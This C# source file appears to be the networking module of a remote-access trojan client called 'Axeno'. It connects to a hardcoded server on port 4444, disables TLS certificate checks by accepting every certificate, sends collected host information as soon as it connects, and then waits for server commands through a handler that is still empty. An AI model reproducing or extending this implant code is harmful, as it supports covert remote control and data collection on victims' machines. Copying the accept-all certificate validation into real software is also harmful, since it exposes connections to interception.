using Axeno.Client.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using Axeno.Client.Helper;

namespace Axeno.Client.Networking
{
    public static class ClientSocket
    {

        public static Socket Socket { get; set; }
        public static SslStream SslClient { get; set; }
        private static byte[] Buffer { get; set; }
        private static long HeaderSize { get; set; }
        private static long Offset { get; set; }
        public static bool IsConnected { get; set; }
        public static void Connect()
        {
            try
            {

                Socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };
                string ServerIPstr = "127.0.0.1";
                int ServerPort = 4444;
                IPAddress serverIP = IPAddress.Parse(ServerIPstr);
                Socket.Connect(serverIP, ServerPort);
                if (Socket.Connected)
                {
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(Socket, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(Socket.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    HeaderSize = 4;
                    Offset = 0;
                    Buffer = new byte[HeaderSize];
                    Send(SendInfo.GetAndSendInformation());
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }
        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
        public static void ReadServerData(IAsyncResult ar)
        {

        }

        public static void Send(byte[] msg)
        {
            try
            {
                if (!IsConnected)
                {
                    return;
                }

                byte[] buffersize = BitConverter.GetBytes(msg.Length);
                Socket.Poll(-1, SelectMode.SelectWrite);
                SslClient.Write(buffersize, 0, buffersize.Length);

                if (msg.Length > 1000000) //1mb
                {
                    Debug.WriteLine("send chunks");
                    using (MemoryStream memoryStream = new MemoryStream(msg))
                    {
                        int read = 0;
                        memoryStream.Position = 0;
                        byte[] chunk = new byte[50 * 1000];
                        while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                        {
                            Socket.Poll(-1, SelectMode.SelectWrite);
                            SslClient.Write(chunk, 0, read);
                            SslClient.Flush();
                        }
                    }
                }
                else
                {
                    Socket.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(msg, 0, msg.Length);
                    SslClient.Flush();
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

    }
}
